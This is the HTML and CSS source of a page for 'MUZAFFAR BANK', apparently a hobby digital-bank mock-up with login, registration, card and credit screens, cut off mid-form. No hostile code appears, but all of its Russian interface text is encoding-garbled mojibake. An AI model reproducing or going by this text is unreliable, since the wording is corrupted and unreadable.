<!DOCTYPE html>
<html lang="ru">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MUZAFFAR BANK ‚Äî –ü—Ä–µ–º–∏—É–º —Ü–∏—Ñ—Ä–æ–≤–æ–π –±–∞–Ω–∫ –¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω–∞</title>

<!-- –ò–∫–æ–Ω–∫–∞ -->
<link rel="icon" type="image/png" href="https://i.ibb.co/4ndNJYKS/Chat-GPT-Image-14-2025-21-36-48.png">

<!-- –®—Ä–∏—Ñ—Ç—ã -->
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

<!-- QR Code –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>

<style>
  /* ===== –û–°–ù–û–í–ù–´–ï –°–¢–ò–õ–ò ===== */
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  :root {
    --primary: #0a4d2e;
    --primary-dark: #073a22;
    --primary-light: #1a5e3a;
    --secondary: #ff9f29;
    --accent: #0088cc;
    --success: #38b000;
    --danger: #d00000;
    --warning: #ff9f1c;
    --info: #0077b6;
    --light: #f8f9fa;
    --dark: #1a1e24;
    --white: #ffffff;
    --gold: #ffd700;
    --gold-dark: #b8860b;
    --platinum: #e5e4e2;
    --platinum-dark: #a0a0a0;
    --shop: #ff6b6b;
    --shop-dark: #ee5253;
    
    --shadow-sm: 0 4px 6px rgba(0, 0, 0, 0.05);
    --shadow-md: 0 10px 25px rgba(0, 0, 0, 0.1);
    --shadow-lg: 0 20px 40px rgba(0, 0, 0, 0.15);
    
    --radius-lg: 16px;
    --radius-xl: 24px;
    --radius-2xl: 32px;
    
    --space-sm: 12px;
    --space-md: 16px;
    --space-lg: 24px;
    --space-xl: 32px;
    --space-2xl: 48px;
  }
  
  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
    min-height: 100vh;
    color: var(--dark);
  }
  
  .container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 var(--space-md);
  }
  
  .hidden {
    display: none !important;
  }
  
  /* ===== –•–ï–î–ï–† ===== */
  .header {
    background: var(--white);
    box-shadow: var(--shadow-sm);
    padding: var(--space-md) 0;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  
  .header-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  
  .logo {
    display: flex;
    align-items: center;
    gap: var(--space-sm);
    font-weight: 700;
    font-size: 1.25rem;
    color: var(--primary);
  }
  
  .logo img {
    height: 36px;
    width: 36px;
    border-radius: 8px;
  }
  
  /* ===== –ö–ù–û–ü–ö–ò ===== */
  .btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    padding: var(--space-sm) var(--space-lg);
    border-radius: 50px;
    font-weight: 600;
    font-size: 0.95rem;
    border: none;
    cursor: pointer;
    transition: all 0.3s ease;
    gap: var(--space-sm);
  }
  
  .btn-primary {
    background: var(--primary);
    color: var(--white);
  }
  
  .btn-primary:hover {
    background: var(--primary-dark);
    transform: translateY(-2px);
    box-shadow: var(--shadow-md);
  }
  
  .btn-outline {
    background: transparent;
    border: 2px solid var(--primary);
    color: var(--primary);
  }
  
  .btn-outline:hover {
    background: var(--primary);
    color: var(--white);
  }
  
  .btn-gold {
    background: linear-gradient(145deg, #ffd700, #b8860b);
    color: var(--dark);
    font-weight: 700;
  }
  
  .btn-platinum {
    background: linear-gradient(145deg, #e5e4e2, #a0a0a0);
    color: var(--dark);
    font-weight: 700;
  }
  
  .btn-small {
    padding: 8px 16px;
    font-size: 0.8rem;
  }
  
  /* ===== –ö–ê–†–¢–û–ß–ö–ò ===== */
  .card {
    background: var(--white);
    border-radius: var(--radius-xl);
    padding: var(--space-xl);
    box-shadow: var(--shadow-sm);
    margin-bottom: var(--space-lg);
  }
  
  /* ===== –ë–ê–ù–ö–û–í–°–ö–ê–Ø –ö–ê–†–¢–ê ===== */
  .bank-card {
    position: relative;
    height: 240px;
    border-radius: var(--radius-xl);
    padding: var(--space-xl);
    color: var(--white);
    overflow: hidden;
    box-shadow: var(--shadow-lg);
    margin-bottom: var(--space-xl);
    background: linear-gradient(145deg, #0a4d2e, #1e6e46);
    transition: transform 0.3s ease;
  }
  
  .bank-card:hover {
    transform: translateY(-5px);
  }
  
  .bank-card.gold {
    background: linear-gradient(145deg, #ffd700, #b8860b);
    color: var(--dark);
  }
  
  .bank-card.platinum {
    background: linear-gradient(145deg, #e5e4e2, #a0a0a0);
    color: var(--dark);
  }
  
  .bank-card-logo {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: var(--space-lg);
  }
  
  .bank-card-type {
    font-size: 1rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 2px;
  }
  
  .bank-card-number {
    font-size: 1.5rem;
    letter-spacing: 3px;
    text-align: center;
    font-family: 'Courier New', monospace;
    margin: var(--space-xl) 0;
  }
  
  .bank-card-details {
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
  }
  
  .bank-card-name {
    font-size: 1rem;
    text-transform: uppercase;
    letter-spacing: 2px;
  }
  
  .bank-card-expiry {
    font-size: 1rem;
    font-family: monospace;
  }
  
  /* ===== –ë–ê–õ–ê–ù–° ===== */
  .balance-container {
    text-align: center;
    margin: var(--space-2xl) 0;
    padding: var(--space-xl);
    background: var(--white);
    border-radius: var(--radius-xl);
    box-shadow: var(--shadow-sm);
  }
  
  .balance {
    font-size: 2.5rem;
    font-weight: 700;
    color: var(--primary);
    margin: var(--space-sm) 0;
  }
  
  /* ===== –ë–´–°–¢–†–´–ï –î–ï–ô–°–¢–í–ò–Ø ===== */
  .actions-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    gap: var(--space-lg);
    margin-top: var(--space-lg);
  }
  
  .action-card {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: var(--space-xl) var(--space-lg);
    border-radius: var(--radius-lg);
    background: var(--white);
    box-shadow: var(--shadow-sm);
    cursor: pointer;
    transition: all 0.3s ease;
  }
  
  .action-card:hover {
    transform: translateY(-5px);
    box-shadow: var(--shadow-md);
    background: var(--primary);
    color: var(--white);
  }
  
  .action-card:hover .material-icons {
    color: var(--white);
  }
  
  .action-icon {
    font-size: 2rem;
    color: var(--primary);
    margin-bottom: var(--space-md);
  }
  
  /* ===== –¢–ê–ë–´ ===== */
  .tabs {
    display: flex;
    gap: var(--space-sm);
    margin-bottom: var(--space-xl);
    overflow-x: auto;
    padding-bottom: 4px;
    flex-wrap: wrap;
  }
  
  .tab {
    padding: 12px 24px;
    cursor: pointer;
    font-weight: 600;
    color: var(--dark);
    border-radius: 50px;
    transition: all 0.2s ease;
    white-space: nowrap;
    background: #f0f0f0;
  }
  
  .tab:hover {
    background: rgba(10, 77, 46, 0.1);
  }
  
  .tab.active {
    background: var(--primary);
    color: var(--white);
  }
  
  /* ===== –ö–ê–†–¢–´ –î–õ–Ø –ü–û–ö–£–ü–ö–ò ===== */
  .purchase-cards-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    gap: var(--space-xl);
    margin-top: var(--space-xl);
  }
  
  .purchase-card {
    background: white;
    border-radius: var(--radius-xl);
    padding: var(--space-xl);
    text-align: center;
    box-shadow: var(--shadow-lg);
    transition: all 0.3s ease;
    border: 2px solid transparent;
  }
  
  .purchase-card:hover {
    transform: translateY(-10px);
    box-shadow: var(--shadow-lg);
  }
  
  .purchase-card.debit {
    border-color: var(--primary);
  }
  
  .purchase-card.gold {
    border-color: #ffd700;
  }
  
  .purchase-card.platinum {
    border-color: #a0a0a0;
  }
  
  .card-icon {
    font-size: 48px !important;
    margin-bottom: var(--space-md);
  }
  
  .debit .card-icon {
    color: var(--primary);
  }
  
  .gold .card-icon {
    color: #ffd700;
  }
  
  .platinum .card-icon {
    color: #a0a0a0;
  }
  
  .card-title {
    font-size: 1.5rem;
    font-weight: 700;
    margin-bottom: var(--space-sm);
  }
  
  .card-price {
    font-size: 2rem;
    font-weight: 700;
    margin-bottom: var(--space-lg);
  }
  
  /* ===== –í–ù–ï–®–ù–ò–ï –ö–ê–†–¢–´ ===== */
  .external-cards-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
    gap: var(--space-lg);
    margin-top: var(--space-lg);
  }
  
  .external-card {
    background: white;
    border-radius: var(--radius-xl);
    padding: var(--space-lg);
    box-shadow: var(--shadow-md);
    transition: all 0.3s ease;
    border-left: 4px solid var(--primary);
    position: relative;
  }
  
  .external-card:hover {
    transform: translateY(-5px);
    box-shadow: var(--shadow-lg);
  }
  
  .external-card.sber { border-left-color: #2e7d32; }
  .external-card.tinkoff { border-left-color: #ffdd2d; }
  .external-card.alfa { border-left-color: #ef3124; }
  .external-card.vtb { border-left-color: #003791; }
  
  .external-card-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: var(--space-md);
  }
  
  .external-card-bank {
    font-weight: 700;
    font-size: 1.1rem;
  }
  
  .external-card-number {
    font-family: 'Courier New', monospace;
    color: #666;
    margin-bottom: var(--space-md);
  }
  
  .external-card-footer {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  
  .delete-external-btn {
    background: rgba(208, 0, 0, 0.1);
    color: var(--danger);
    border: none;
    width: 36px;
    height: 36px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.3s ease;
  }
  
  .delete-external-btn:hover {
    background: var(--danger);
    color: white;
  }
  
  /* ===== –ö–†–ï–î–ò–¢–´ ===== */
  .credit-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    gap: var(--space-lg);
    margin-top: var(--space-lg);
  }
  
  .credit-card {
    padding: var(--space-xl);
    border-radius: var(--radius-xl);
    background: linear-gradient(145deg, #4a4e69, #22223b);
    color: var(--white);
    transition: transform 0.3s ease;
  }
  
  .credit-card:hover {
    transform: translateY(-5px);
  }
  
  .credit-amount {
    font-size: 2rem;
    font-weight: 700;
    margin: var(--space-md) 0;
  }
  
  /* ===== –§–û–†–ú–´ ===== */
  .form-group {
    margin-bottom: var(--space-lg);
  }
  
  .form-label {
    display: block;
    margin-bottom: var(--space-sm);
    font-weight: 600;
    color: var(--dark);
  }
  
  .form-control {
    width: 100%;
    padding: 12px 16px;
    border: 2px solid #e0e0e0;
    border-radius: 50px;
    font-size: 0.95rem;
    transition: all 0.3s ease;
  }
  
  .form-control:focus {
    outline: none;
    border-color: var(--primary);
    box-shadow: 0 0 0 4px rgba(10, 77, 46, 0.1);
  }
  
  /* ===== –ú–û–î–ê–õ–¨–ù–´–ï –û–ö–ù–ê ===== */
  .modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    backdrop-filter: blur(5px);
    padding: var(--space-md);
  }
  
  .modal-content {
    background: white;
    border-radius: var(--radius-xl);
    padding: var(--space-xl);
    max-width: 500px;
    width: 100%;
    max-height: 90vh;
    overflow-y: auto;
    box-shadow: var(--shadow-lg);
  }
  
  .modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: var(--space-lg);
  }
  
  .modal-title {
    font-size: 1.25rem;
    font-weight: 700;
    display: flex;
    align-items: center;
    gap: var(--space-sm);
  }
  
  .modal-close {
    background: none;
    border: none;
    font-size: 24px;
    cursor: pointer;
    color: #999;
  }
  
  .modal-footer {
    display: flex;
    justify-content: flex-end;
    gap: var(--space-sm);
    margin-top: var(--space-lg);
  }
  
  /* ===== –ö–ù–û–ü–ö–ò –î–ï–ô–°–¢–í–ò–ô ===== */
  .action-buttons {
    position: fixed;
    bottom: 30px;
    right: 30px;
    display: flex;
    flex-direction: column;
    gap: 15px;
    z-index: 9999;
  }
  
  .action-btn {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    border: none;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 8px 25px rgba(0,0,0,0.2);
    position: relative;
  }
  
  .action-btn:hover {
    transform: scale(1.1) translateY(-5px);
    box-shadow: 0 15px 30px rgba(0,0,0,0.3);
  }
  
  .action-btn .material-icons {
    font-size: 28px;
  }
  
  .action-btn svg {
    width: 28px;
    height: 28px;
    fill: white;
  }
  
  .tooltip {
    position: absolute;
    right: 75px;
    background: var(--dark);
    color: white;
    padding: 8px 16px;
    border-radius: 40px;
    font-size: 14px;
    white-space: nowrap;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
  }
  
  .action-btn:hover .tooltip {
    opacity: 1;
  }
  
  .btn-taxi { background: linear-gradient(145deg, #ff9f29, #e68a00); }
  .btn-ai { background: linear-gradient(145deg, #8e44ad, #6c3483); }
  .btn-telegram { background: linear-gradient(145deg, #0088cc, #006699); }
  .btn-call { background: linear-gradient(145deg, #2ecc71, #27ae60); }
  .btn-shop-action { background: linear-gradient(145deg, #ff6b6b, #ee5253); }
  
  /* ===== –°–ü–ò–°–û–ö –ö–ê–†–¢ ===== */
  .cards-container {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: var(--space-lg);
    margin-bottom: var(--space-lg);
  }
  
  .card-item {
    height: 180px;
    border-radius: var(--radius-lg);
    padding: var(--space-lg);
    color: var(--white);
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
  }
  
  .card-item:hover {
    transform: translateY(-5px);
    box-shadow: var(--shadow-lg);
  }
  
  .card-item.active {
    border: 3px solid var(--primary);
  }
  
  .card-status {
    position: absolute;
    top: 10px;
    right: 10px;
    background: rgba(255,255,255,0.2);
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: bold;
  }
  
  /* ===== –§–£–¢–ï–† ===== */
  .footer {
    background: var(--dark);
    color: var(--white);
    padding: var(--space-2xl) 0;
    margin-top: var(--space-2xl);
  }
  
  /* ===== –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø ===== */
  .alert {
    padding: var(--space-md);
    border-radius: var(--radius-lg);
    margin-bottom: var(--space-md);
  }
  
  .alert-success {
    background: rgba(56, 176, 0, 0.1);
    color: var(--success);
  }
  
  .alert-error {
    background: rgba(208, 0, 0, 0.1);
    color: var(--danger);
  }
  
  /* ===== –ê–î–ê–ü–¢–ò–í–ù–û–°–¢–¨ ===== */
  @media (max-width: 768px) {
    .action-buttons {
      bottom: 20px;
      right: 20px;
      gap: 12px;
    }
    
    .action-btn {
      width: 50px;
      height: 50px;
    }
    
    .tooltip {
      right: 65px;
      font-size: 12px;
      padding: 6px 12px;
    }
    
    .bank-card-number {
      font-size: 1.2rem;
    }
  }
</style>
</head>

<body>
  <!-- ===== –ö–ù–û–ü–ö–ò –î–ï–ô–°–¢–í–ò–ô ===== -->
  <div class="action-buttons">
    <button class="action-btn btn-taxi" onclick="window.open('https://famd-sn.github.io/Muzaffar-/taxi.html', '_blank')" title="–¢–∞–∫—Å–∏">
      <span class="material-icons">local_taxi</span>
      <span class="tooltip">–ó–∞–∫–∞–∑–∞—Ç—å —Ç–∞–∫—Å–∏</span>
    </button>
    
    <button class="action-btn btn-ai" onclick="window.open('https://–≤–∞—à–∞-—Å—Å—ã–ª–∫–∞-–Ω–∞-ai.com', '_blank')" title="AI –ê—Å—Å–∏—Å—Ç–µ–Ω—Ç">
      <span class="material-icons">smart_toy</span>
      <span class="tooltip">AI –ê—Å—Å–∏—Å—Ç–µ–Ω—Ç</span>
    </button>
    
    <button class="action-btn btn-shop-action" onclick="window.open('https://famd-sn.github.io/Muzaffar-/bankshop.html', '_blank')" title="–ú–∞–≥–∞–∑–∏–Ω">
      <span class="material-icons">shopping_cart</span>
      <span class="tooltip">–ü–µ—Ä–µ–π—Ç–∏ –≤ –º–∞–≥–∞–∑–∏–Ω</span>
    </button>
    
    <a href="https://t.me/fgvvn2" target="_blank" class="action-btn btn-telegram" title="Telegram">
      <svg viewBox="0 0 24 24">
        <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.224-.536.224l.213-3.053 5.56-5.022c.241-.213-.054-.334-.373-.121l-6.869 4.326-2.962-.924c-.643-.203-.658-.643.136-.953l11.57-4.461c.538-.196 1.006.128.832.941z"/>
      </svg>
      <span class="tooltip">–ù–∞–ø–∏—Å–∞—Ç—å –≤ Telegram</span>
    </a>
    
    <button class="action-btn btn-call" onclick="window.open('https://muzaffarsharipov058-creator.github.io/muzaffar/', '_blank')" title="–ü–æ–∑–≤–æ–Ω–∏—Ç—å">
      <span class="material-icons">call</span>
      <span class="tooltip">–ü–æ–∑–≤–æ–Ω–∏—Ç—å</span>
    </button>
  </div>

  <!-- ===== –≠–ö–†–ê–ù –ê–í–¢–û–†–ò–ó–ê–¶–ò–ò ===== -->
  <div id="auth-screen">
    <div class="container" style="min-height: 100vh; display: flex; align-items: center; justify-content: center;">
      <div class="card" style="max-width: 450px; width: 100%;">
        <div style="text-align: center; margin-bottom: var(--space-xl);">
          <div class="logo" style="justify-content: center;">
            <img src="https://i.ibb.co/4ndNJYKS/Chat-GPT-Image-14-2025-21-36-48.png" alt="MUZAFFAR BANK">
            <span>MUZAFFAR BANK</span>
          </div>
          <h2 style="color: var(--primary); margin: var(--space-lg) 0 var(--space-sm);">–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å</h2>
          <p>–í–æ–π–¥–∏—Ç–µ –∏–ª–∏ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å</p>
        </div>
        
        <!-- –§–æ—Ä–º–∞ –≤—Ö–æ–¥–∞ -->
        <div id="login-form">
          <div class="form-group">
            <label class="form-label">Email</label>
            <input type="email" id="login-email" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à email">
          </div>
          <div class="form-group">
            <label class="form-label">–ü–∞—Ä–æ–ª—å</label>
            <input type="password" id="login-password" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å">
          </div>
          <button id="login-btn" class="btn btn-primary" style="width: 100%; margin-bottom: var(--space-md);">
            <span class="material-icons">login</span>–í–æ–π—Ç–∏
          </button>
          <p style="text-align: center;">
            –ù–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? 
            <a href="#" id="show-register" style="color: var(--primary); font-weight: 600;">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>
          </p>
        </div>
        
        <!-- –§–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ -->
        <div id="register-form" style="display: none;">
          <div class="form-group">
            <label class="form-label">–ü–æ–ª–Ω–æ–µ –∏–º—è</label>
            <input type="text" id="register-fullname" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –ø–æ–ª–Ω–æ–µ –∏–º—è">
          </div>
          <div class="form-group">
            <label class="form-label">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
            <input type="tel" id="register-phone" class="form-control" placeholder="+992 00 000 0000">
          </div>
          <div class="form-group">
            <label class="form-label">Email</label>
            <input type="email" id="register-email" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à email">
          </div>
          <div class="form-group">
            <label class="form-label">–ü–∞—Ä–æ–ª—å</label>
            <input type="password" id="register-password" class="form-control" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å (–º–∏–Ω. 6 —Å–∏–º–≤–æ–ª–æ–≤)">
          </div>
          <button id="register-btn" class="btn btn-primary" style="width: 100%; margin-bottom: var(--space-md);">
            <span class="material-icons">person_add</span>–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è
          </button>
          <p style="text-align: center;">
            –£–∂–µ –µ—Å—Ç—å –∞–∫–∫–∞—É–Ω—Ç? 
            <a href="#" id="show-login" style="color: var(--primary); font-weight: 600;">–í–æ–π—Ç–∏</a>
          </p>
        </div>
        
        <div id="auth-message" class="alert hidden"></div>
      </div>
    </div>
  </div>

  <!-- ===== –ë–ê–ù–ö–û–í–°–ö–ò–ô –≠–ö–†–ê–ù ===== -->
  <div id="bank-screen" class="hidden">
    <!-- –•–µ–¥–µ—Ä -->
    <header class="header">
      <div class="container header-container">
        <div class="logo">
          <img src="https://i.ibb.co/4ndNJYKS/Chat-GPT-Image-14-2025-21-36-48.png" alt="MUZAFFAR BANK">
          <span>MUZAFFAR BANK</span>
        </div>
        <div style="display: flex; align-items: center; gap: var(--space-md);">
          <span id="user-display-name" style="font-weight: 600;"></span>
          <span id="admin-badge" class="hidden" style="background: var(--secondary); color: var(--dark); padding: 4px 12px; border-radius: 50px; font-size: 12px; font-weight: 700;">–ê–î–ú–ò–ù</span>
          <button id="logout-btn" class="btn btn-outline btn-small">
            <span class="material-icons">logout</span>–í—ã–π—Ç–∏
          </button>
        </div>
      </div>
    </header>

    <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–Ω—Ç -->
    <main class="container" style="padding: var(--space-xl) 0;">
      <!-- –¢–∞–±—ã -->
      <div class="tabs">
        <div class="tab active" data-tab="dashboard">–ì–ª–∞–≤–Ω–∞—è</div>
        <div class="tab" data-tab="my-cards">–ú–æ–∏ –∫–∞—Ä—Ç—ã</div>
        <div class="tab" data-tab="external-cards">–î—Ä—É–≥–∏–µ –±–∞–Ω–∫–∏</div>
        <div class="tab" data-tab="buy-cards">–ö—É–ø–∏—Ç—å –∫–∞—Ä—Ç—É</div>
        <div class="tab" data-tab="credits">–ö—Ä–µ–¥–∏—Ç—ã</div>
        <div class="tab" data-tab="qr-generator">QR-–≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä</div>
      </div>
      
      <!-- ===== –ì–õ–ê–í–ù–ê–Ø ===== -->
      <div id="dashboard-tab" class="tab-content">
        <div class="bank-card" id="active-card-display">
          <div class="bank-card-logo">
            <img src="https://i.ibb.co/4ndNJYKS/Chat-GPT-Image-14-2025-21-36-48.png" alt="MUZAFFAR BANK" style="height: 24px;">
            <div class="bank-card-type" id="active-card-type-label">–î–µ–±–µ—Ç–æ–≤–∞—è</div>
          </div>
          <div class="bank-card-number" id="active-card-number">‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢</div>
          <div class="bank-card-details">
            <div class="bank-card-name" id="active-card-name">–ò–ú–Ø</div>
            <div class="bank-card-expiry" id="active-card-expiry">12/28</div>
          </div>
        </div>

        <div class="balance-container">
          <div style="color: #666; margin-bottom: var(--space-sm);">
            <span class="material-icons">account_balance_wallet</span>
            –ë–∞–ª–∞–Ω—Å
            <span id="active-card-badge" style="background: var(--primary); color: white; padding: 4px 12px; border-radius: 50px; font-size: 12px; margin-left: 8px;">–û—Å–Ω–æ–≤–Ω–∞—è</span>
          </div>
          <div class="balance" id="balance">0 —Å–æ–º.</div>
          <div style="display: flex; gap: var(--space-md); justify-content: center; margin-top: var(--space-lg); flex-wrap: wrap;">
            <button class="btn btn-primary" onclick="document.getElementById('deposit-modal').classList.remove('hidden')">
              <span class="material-icons">add</span>–ü–æ–ø–æ–ª–Ω–∏—Ç—å
            </button>
            <button class="btn btn-primary" onclick="document.getElementById('transfer-modal').classList.remove('hidden')">
              <span class="material-icons">send</span>–ü–µ—Ä–µ–≤–µ—Å—Ç–∏
            </button>
            <button class="btn btn-outline" onclick="showQuickQRCode()">
              <span class="material-icons">qr_code</span>QR-–∫–æ–¥
            </button>
          </div>
        </div>

        <div class="card">
          <h3 style="margin-bottom: var(--space-lg);">–ë—ã—Å—Ç—Ä—ã–µ –¥–µ–π—Å—Ç–≤–∏—è</h3>
          <div class="actions-grid">
            <div class="action-card" onclick="document.getElementById('deposit-modal').classList.remove('hidden')">
              <span class="material-icons action-icon">account_balance</span>
              <span>–ü–æ–ø–æ–ª–Ω–∏—Ç—å</span>
            </div>
            <div class="action-card" onclick="document.getElementById('transfer-modal').classList.remove('hidden')">
              <span class="material-icons action-icon">swap_horiz</span>
              <span>–ü–µ—Ä–µ–≤–µ—Å—Ç–∏</span>
            </div>
            <div class="action-card" onclick="showQuickQRCode()">
              <span class="material-icons action-icon">qr_code_scanner</span>
              <span>–ú–æ–π QR</span>
            </div>
            <div class="action-card" onclick="showTransactionHistory()">
              <span class="material-icons action-icon">history</span>
              <span>–ò—Å—Ç–æ—Ä–∏—è</span>
            </div>
          </div>
        </div>

        <div class="card">
          <h3 style="margin-bottom: var(--space-lg);">–ü–æ—Å–ª–µ–¥–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏</h3>
          <div id="recent-transactions">
            <div style="text-align: center; padding: var(--space-xl); color: #666;">
              <span class="material-icons" style="font-size: 48px; color: #ccc; margin-bottom: var(--space-sm); display: block;">payments</span>
              <p>–ù–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏–π</p>
            </div>
          </div>
        </div>
      </div>
      
      <!-- ===== –ú–û–ò –ö–ê–†–¢–´ ===== -->
      <div id="my-cards-tab" class="tab-content hidden">
        <div class="card">
          <h3 style="margin-bottom: var(--space-lg);">–ú–æ–∏ –∫–∞—Ä—Ç—ã</h3>
          <div class="cards-container" id="cards-list"></div>
          <div style="text-align: center; margin-top: var(--space-xl);">
            <button id="add-card-btn" class="btn btn-primary">
              <span class="material-icons">add</span>–î–æ–±–∞–≤–∏—Ç—å –∫–∞—Ä—Ç—É
            </button>
          </div>
        </div>
      </div>
      
      <!-- ===== –ö–ê–†–¢–´ –î–†–£–ì–ò–• –ë–ê–ù–ö–û–í ===== -->
      <div id="external-cards-tab" class="tab-content hidden">
        <div class="card">
          <h3 style="margin-bottom: var(--space-lg);">–ö–∞—Ä—Ç—ã –¥—Ä—É–≥–∏—Ö –±–∞–Ω–∫–æ–≤</h3>
          <div id="external-cards-list" class="external-cards-grid">
            <div style="text-align: center; padding: var(--space-xl); color: #666; grid-column: 1 / -1;">
              <span class="material-icons" style="font-size: 48px; color: #ccc; margin-bottom: var(--space-sm); display: block;">credit_card_off</span>
              <p>–ù–µ—Ç –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç</p>
            </div>
          </div>
          <div style="text-align: center; margin-top: var(--space-xl);">
            <button id="add-external-card-btn" class="btn btn-primary">
              <span class="material-icons">add_link</span>–ü—Ä–∏–≤—è–∑–∞—Ç—å –∫–∞—Ä—Ç—É –¥—Ä—É–≥–æ–≥–æ –±–∞–Ω–∫–∞
            </button>
          </div>
        </div>
      </div>
      
      <!-- ===== –ö–£–ü–ò–¢–¨ –ö–ê–†–¢–£ ===== -->
      <div id="buy-cards-tab" class="tab-content hidden">
        <div class="card">
          <h3 style="margin-bottom: var(--space-xl);">–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ä—Ç—É</h3>
          <div class="purchase-cards-grid">
            <div class="purchase-card debit">
              <span class="material-icons card-icon">credit_card</span>
              <div class="card-title">–î–µ–±–µ—Ç–æ–≤–∞—è</div>
              <div class="card-price">0 —Å–æ–º.</div>
              <button class="btn btn-primary get-card-btn" data-card-type="debit" style="width: 100%;">
                –ü–æ–ª—É—á–∏—Ç—å
              </button>
            </div>
            <div class="purchase-card gold">
              <span class="material-icons card-icon">star</span>
              <div class="card-title">Gold</div>
              <div class="card-price">500 —Å–æ–º.</div>
              <button class="btn btn-gold get-card-btn" data-card-type="gold" style="width: 100%;">
                –ö—É–ø–∏—Ç—å
              </button>
            </div>
            <div class="purchase-card platinum">
              <span class="material-icons card-icon">diamond</span>
              <div class="card-title">Platinum</div>
              <div class="card-price">1000 —Å–æ–º.</div>
              <button class="btn btn-platinum get-card-btn" data-card-type="platinum" style="width: 100%;">
                –ö—É–ø–∏—Ç—å
              </button>
            </div>
          </div>
        </div>
      </div>
      
      <!-- ===== –ö–†–ï–î–ò–¢–´ ===== -->
      <div id="credits-tab" class="tab-content hidden">
        <div class="card">
          <h3 style="margin-bottom: var(--space-lg);">–ö—Ä–µ–¥–∏—Ç–Ω—ã–π –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä</h3>
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-xl);">
            <div>
              <div class="form-group">
                <label class="form-label">–°—É–º–º–∞ –∫—Ä–µ–¥–∏—Ç–∞</label>
                <input type="number" id="credit-amount" class="form-control" value="10000">
              </div>
              <div class="form-group">
                <label class="form-label">–°—Ä–æ–∫ (–º–µ—Å—è—Ü–µ–≤)</label>
                <select id="credit-term" class="form-control">
                  <option value="6">6 –º–µ—Å—è—Ü–µ–≤</option>
                  <option value="12" selected>12 –º–µ—Å—è—Ü–µ–≤</option>
                  <option value="24">24 –º–µ—Å—è—Ü–∞</option>
                </select>
              </div>
              <div class="form-group">
                <label class="form-label">–°—Ç–∞–≤–∫–∞</label>
